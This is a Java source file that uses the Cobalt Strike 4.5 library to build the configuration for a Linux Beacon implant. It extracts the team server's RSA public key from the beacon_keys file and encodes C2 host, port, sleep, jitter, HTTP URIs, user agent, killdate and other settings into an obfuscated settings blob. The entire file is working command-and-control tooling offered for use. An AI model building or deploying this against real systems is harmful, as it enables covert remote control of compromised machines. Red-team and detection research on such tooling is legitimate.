/*
 * Settings-only exporter for LinuxBeacon (CS 4.5).
 *
 * Public key sources (pick one):
 *   --beacon-keys .cobaltstrike.beacon_keys   (recommended; auto-extract RSA public DER)
 *   --pubkey publickey.der
 *
 * Build:
 *   javac -encoding UTF-8 -cp "cobaltstrike.jar" -d out LinuxBeaconBridge.java
 *
 * Run:
 *   java -cp "out:cobaltstrike.jar" LinuxBeaconBridge \
 *     --host H --port P --https 0|1 \
 *     --beacon-keys /path/.cobaltstrike.beacon_keys \
 *     --out settings.bin [--profile file | --default-profile]
 */
import beacon.BeaconPayload;
import beacon.Settings;
import c2profile.Loader;
import c2profile.Profile;
import common.CommonUtils;
import dns.QuickSecurity;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.security.KeyPair;
import java.security.PublicKey;
import java.util.Collection;
import java.util.LinkedList;

public class LinuxBeaconBridge {

    public static void main(String[] args) {
        try {
            main0(args);
        } catch (Throwable t) {
            System.err.println("[bridge] UNCAUGHT: " + t);
            t.printStackTrace(System.err);
            System.err.flush();
            System.exit(1);
        }
    }

    private static void main0(String[] args) throws Exception {
        String host = null;
        int port = -1;
        int https = 0;
        String pubkeyPath = null;
        String beaconKeysPath = null;
        String outPath = null;
        String profilePath = null;
        boolean defaultProfile = false;
        Integer sleepOverride = null;
        Integer jitterOverride = null;
        String uriOverride = null;
        String postUriOverride = null;
        String hostHeader = "";
        String uaOverride = null;
        String dumpDerPath = null;

        System.err.println("[bridge] LinuxBeaconBridge starting, argc=" + args.length);
        System.err.flush();

        for (int i = 0; i < args.length; i++) {
            String a = args[i];
            if ("--host".equals(a) && i + 1 < args.length) {
                host = args[++i];
            } else if ("--port".equals(a) && i + 1 < args.length) {
                port = Integer.parseInt(args[++i]);
            } else if ("--https".equals(a) && i + 1 < args.length) {
                https = Integer.parseInt(args[++i]);
            } else if ("--pubkey".equals(a) && i + 1 < args.length) {
                pubkeyPath = args[++i];
            } else if ("--beacon-keys".equals(a) && i + 1 < args.length) {
                beaconKeysPath = args[++i];
            } else if ("--dump-der".equals(a) && i + 1 < args.length) {
                dumpDerPath = args[++i];
            } else if ("--out".equals(a) && i + 1 < args.length) {
                outPath = args[++i];
            } else if ("--profile".equals(a) && i + 1 < args.length) {
                profilePath = args[++i];
            } else if ("--default-profile".equals(a)) {
                defaultProfile = true;
            } else if ("--sleep".equals(a) && i + 1 < args.length) {
                sleepOverride = Integer.parseInt(args[++i]);
            } else if ("--jitter".equals(a) && i + 1 < args.length) {
                jitterOverride = Integer.parseInt(args[++i]);
            } else if ("--uri".equals(a) && i + 1 < args.length) {
                uriOverride = args[++i];
            } else if ("--post-uri".equals(a) && i + 1 < args.length) {
                postUriOverride = args[++i];
            } else if ("--host-header".equals(a) && i + 1 < args.length) {
                hostHeader = args[++i];
            } else if ("--ua".equals(a) && i + 1 < args.length) {
                uaOverride = args[++i];
            } else if ("-h".equals(a) || "--help".equals(a)) {
                usage();
                return;
            } else {
                System.err.println("Unknown arg: " + a);
                usage();
                System.exit(2);
            }
        }

        /* Keys-only mode: extract DER and exit */
        if (beaconKeysPath != null && outPath == null && host == null) {
            byte[] der = loadPublicKeyFromBeaconKeys(beaconKeysPath);
            File dest = new File(dumpDerPath != null ? dumpDerPath : "publickey.der");
            writeBytes(dest, der);
            System.out.println("wrote " + dest.getAbsolutePath() + " (" + der.length + " bytes DER public key)");
            return;
        }

        if (host == null || port < 0 || outPath == null) {
            usage();
            System.exit(2);
        }
        if (beaconKeysPath == null && pubkeyPath == null) {
            System.err.println("provide --beacon-keys .cobaltstrike.beacon_keys  OR  --pubkey publickey.der");
            System.exit(2);
        }

        System.err.println("[bridge] start host=" + host + " port=" + port + " https=" + https
            + " out=" + outPath);
        System.err.flush();

        byte[] pubkey;
        try {
            if (beaconKeysPath != null && !beaconKeysPath.isEmpty()) {
                pubkey = loadPublicKeyFromBeaconKeys(beaconKeysPath);
                System.err.println("[bridge] public key from beacon_keys (" + pubkey.length + " bytes DER)");
                if (dumpDerPath != null) {
                    writeBytes(new File(dumpDerPath), pubkey);
                    System.err.println("[bridge] also wrote " + dumpDerPath);
                }
            } else {
                File pk = new File(pubkeyPath);
                if (!pk.isFile()) {
                    System.err.println("pubkey not found: " + pubkeyPath);
                    System.exit(1);
                }
                pubkey = Files.readAllBytes(pk.toPath());
                System.err.println("[bridge] public key from DER file (" + pubkey.length + " bytes)");
            }
        } catch (Throwable t) {
            System.err.println("[bridge] FATAL loading keys: " + t);
            t.printStackTrace(System.err);
            System.exit(1);
            return;
        }
        System.err.flush();
        if (pubkey.length > 256) {
            System.err.println("pubkey longer than 256 bytes; truncating");
            byte[] t = new byte[256];
            System.arraycopy(pubkey, 0, t, 0, 256);
            pubkey = t;
        }

        Profile profile;
        if (profilePath != null && !profilePath.isEmpty()) {
            profile = Loader.LoadProfile(profilePath);
            if (profile == null) {
                System.err.println("failed to load profile: " + profilePath);
                System.exit(1);
            }
            System.err.println("[bridge] loaded profile: " + profilePath);
        } else {
            profile = Loader.LoadDefaultProfile();
            if (profile == null) {
                System.err.println("failed to load jar default.profile; provide --profile");
                System.exit(1);
            }
            System.err.println("[bridge] using jar resources/default.profile");
        }

        byte[] blob = buildSettings(
            profile,
            host,
            port,
            https != 0,
            pubkey,
            sleepOverride,
            jitterOverride,
            uriOverride,
            postUriOverride,
            hostHeader,
            uaOverride
        );

        writeBytes(new File(outPath), blob);
        System.out.println("wrote " + outPath + " (" + blob.length + " bytes, XOR-masked)");
    }

    /**
     * Same as tools/DumpPublicKey: Java serialized KeyPair via CommonUtils.readObject.
     */
    public static byte[] loadPublicKeyFromBeaconKeys(String path) throws Exception {
        File file = new File(path);
        if (!file.isFile()) {
            throw new IOException("beacon_keys not found: " + path);
        }
        System.err.println("[bridge] reading KeyPair from " + file.getAbsolutePath());
        Object obj;
        try {
            obj = CommonUtils.readObject(file, null);
        } catch (Throwable t) {
            throw new IOException("CommonUtils.readObject failed on beacon_keys: " + t, t);
        }
        if (!(obj instanceof KeyPair)) {
            throw new IOException("unexpected object in beacon_keys: " +
                (obj == null ? "null" : obj.getClass().getName()));
        }
        KeyPair kp = (KeyPair) obj;
        PublicKey pub = kp.getPublic();
        if (pub == null) {
            throw new IOException("KeyPair has null public key");
        }
        byte[] der = pub.getEncoded();
        if (der == null || der.length == 0) {
            throw new IOException("empty public key encoding");
        }
        System.err.println("[bridge] extracted public key algorithm=" + pub.getAlgorithm()
            + " derLen=" + der.length);
        return der;
    }

    private static void writeBytes(File out, byte[] data) throws IOException {
        File parent = out.getParentFile();
        if (parent != null) {
            parent.mkdirs();
        }
        try (FileOutputStream fos = new FileOutputStream(out)) {
            fos.write(data);
        }
    }

    private static void usage() {
        System.err.println(
            "Usage:\n"
                + "  LinuxBeaconBridge --host H --port P --https 0|1 --out settings.bin\n"
                + "    (--beacon-keys FILE | --pubkey der)\n"
                + "    [--profile file | --default-profile] [--sleep ms] [--jitter n]\n"
                + "    [--uri /path] [--post-uri /submit.php] [--host-header ...] [--ua ...]\n"
                + "    [--dump-der out.der]   also write extracted public DER\n"
                + "\n"
                + "  Keys only:\n"
                + "  LinuxBeaconBridge --beacon-keys .cobaltstrike.beacon_keys [--dump-der publickey.der]\n"
        );
    }

    public static byte[] buildSettings(
        Profile c2profile,
        String hostsCsv,
        int port,
        boolean isHttps,
        byte[] publickey,
        Integer sleepOverride,
        Integer jitterOverride,
        String uriOverride,
        String postUriOverride,
        String hostHeaderLine,
        String uaOverride
    ) throws IOException {
        String[] uris;
        if (uriOverride != null && !uriOverride.isEmpty()) {
            uris = new String[] { uriOverride };
        } else {
            String raw = c2profile.getString(".http-get.uri");
            if (raw == null || raw.isEmpty() || "null".equals(raw)) {
                raw = "/en_US/all.js";
            }
            uris = raw.split(" ");
        }

        String[] hosts = hostsCsv.split(",\\s*");
        LinkedList domains = new LinkedList();
        for (int i = 0; i < hosts.length; i++) {
            if (hosts[i].isEmpty()) {
                continue;
            }
            domains.add(hosts[i]);
            domains.add(CommonUtils.pick(uris));
        }
        while (domains.size() > 2 && CommonUtils.join((Collection) domains, (String) ",").length() > 255) {
            domains.removeLast();
            domains.removeLast();
        }

        int sleeptime = sleepOverride != null
            ? sleepOverride.intValue()
            : safeParseInt(c2profile.getString(".sleeptime"), 60000);
        int maxget = c2profile.size(".http-get.server.output", 1048576);
        int jitter = jitterOverride != null
            ? jitterOverride.intValue()
            : safeParseInt(c2profile.getString(".jitter"), 0);
        if (jitter < 0 || jitter > 99) {
            jitter = 0;
        }

        int proto = 0;
        if (isHttps) {
            proto |= 0x08;
        }

        Settings s = new Settings();
        s.addShort(1, proto);
        s.addShort(2, port);
        s.addInt(3, sleeptime);
        s.addInt(4, maxget);
        s.addShort(5, jitter);
        s.addData(7, publickey, 256);
        s.addString(8, CommonUtils.join((Collection) domains, (String) ","), 256);

        s.addShort(67, 0);
        s.addInt(68, -1);
        s.addInt(69, -1);
        s.addInt(70, -1);

        s.addData(14, CommonUtils.asBinary(c2profile.getString(".spawnto")), 16);
        s.addString(29, nz(c2profile.getString(".post-ex.spawnto_x86"), "%windir%\\syswow64\\rundll32.exe"), 64);
        s.addString(30, nz(c2profile.getString(".post-ex.spawnto_x64"), "%windir%\\sysnative\\rundll32.exe"), 64);
        s.addShort(31, QuickSecurity.getCryptoScheme());
        s.addString(26, nz(c2profile.getString(".http-get.verb"), "GET"), 16);
        s.addString(27, nz(c2profile.getString(".http-post.verb"), "POST"), 16);
        s.addInt(28, c2profile.shouldChunkPosts() ? 96 : 0);
        s.addInt(37, safeGetInt(c2profile, ".watermark", 0));
        String wh = c2profile.getString(".watermarkHash");
        if (wh == null || "null".equals(wh)) {
            wh = "";
        }
        s.addString(36, wh, 32);
        s.addShort(38, c2profile.option(".stage.cleanup") ? 1 : 0);
        s.addShort(39, c2profile.exerciseCFGCaution() ? 1 : 0);

        s.addInt(71, 0);
        s.addInt(72, 0);
        s.addInt(73, 0);

        setupHTTP(s, c2profile, postUriOverride, uaOverride);

        if (hostHeaderLine != null && hostHeaderLine.length() > 0) {
            if (Profile.usesHostBeacon(c2profile)) {
                s.addString(54, "", 128);
            } else if (hostHeaderLine.startsWith("Host:")) {
                s.addString(54, hostHeaderLine.endsWith("\n") ? hostHeaderLine : hostHeaderLine + "\r\n", 128);
            } else {
                s.addString(54, "Host: " + hostHeaderLine + "\r\n", 128);
            }
        } else {
            s.addString(54, "", 128);
        }

        if (Profile.usesCookieBeacon(c2profile)) {
            s.addShort(50, 1);
        } else {
            s.addShort(50, 0);
        }

        s.addShort(55, 0);
        if (!c2profile.hasString(".killdate")) {
            s.addInt(40, 0);
        } else {
            String kd = c2profile.getString(".killdate");
            if (kd != null && !"null".equals(kd) && kd.contains("-")) {
                String[] p = kd.split("-");
                int y = (short) CommonUtils.toNumber(p[0], 0) * 10000;
                int m = (short) CommonUtils.toNumber(p[1], 0) * 100;
                short d = (short) CommonUtils.toNumber(p[2], 0);
                s.addInt(40, y + m + d);
            } else {
                s.addInt(40, 0);
            }
        }

        BeaconPayload.setupPivotFrames(c2profile, s);

        byte[] patch = s.toPatch();
        return BeaconPayload.beacon_obfuscate(patch);
    }

    private static void setupHTTP(
        Settings s,
        Profile c2profile,
        String postUriOverride,
        String uaOverride
    ) throws IOException {
        String ua = uaOverride != null && !uaOverride.isEmpty()
            ? uaOverride
            : BeaconPayload.randua(c2profile);
        String postUri;
        if (postUriOverride != null && !postUriOverride.isEmpty()) {
            postUri = postUriOverride;
        } else {
            String raw = c2profile.getString(".http-post.uri");
            if (raw == null || raw.isEmpty() || "null".equals(raw)) {
                raw = "/submit.php";
            }
            postUri = CommonUtils.pick(raw.split(" "));
        }
        byte[] recover = c2profile.recover_binary(".http-get.server.output");
        byte[] getClient = c2profile.apply_binary(".http-get.client");
        byte[] postClient = c2profile.apply_binary(".http-post.client");
        s.addString(9, ua, 256);
        s.addString(10, postUri, 64);
        s.addData(11, recover, 256);
        s.addData(12, getClient, 512);
        s.addData(13, postClient, 512);
        String remove = c2profile.getHeadersToRemove();
        if (remove != null && remove.length() > 0 && !"null".equals(remove)) {
            s.addString(59, remove, 64);
        }
    }

    private static String nz(String v, String d) {
        return v == null || v.isEmpty() || "null".equals(v) ? d : v;
    }

    private static int safeParseInt(String s, int def) {
        try {
            if (s == null || s.isEmpty() || "null".equals(s)) {
                return def;
            }
            return Integer.parseInt(s);
        } catch (Exception e) {
            return def;
        }
    }

    private static int safeGetInt(Profile p, String key, int def) {
        return safeParseInt(p.getString(key), def);
    }
}
